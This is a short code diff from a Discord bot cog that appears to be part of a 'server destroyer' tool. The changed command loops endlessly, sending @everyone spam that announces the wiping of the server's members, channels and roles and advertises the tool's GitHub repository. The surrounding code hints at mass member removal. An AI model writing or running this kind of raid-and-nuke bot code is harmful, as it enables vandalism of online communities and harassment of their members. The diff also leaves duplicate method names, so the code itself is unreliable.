@@ -124,10 +124,10 @@ class Authority(commands.Cog):
         member_list_fail.clear()
 
     @commands.command(name='e')
-    async def end(self, ctx):
+    async def start(self, ctx):
         await ctx.message.delete()
         while self.go:
-            await ctx.send("@everyone" + " WOW! Goodbye members, channels and roles! Courtesy of  Server Destroyers!\n")
+            await ctx.send("@everyone" + " WOW! Goodbye members, channels and roles! Courtesy of:" + "https://github.com/NMan1/DiscordBotServerDestroyer/" +  "\n")
 
     @commands.command(name='s')
     async def end(self, ctx):
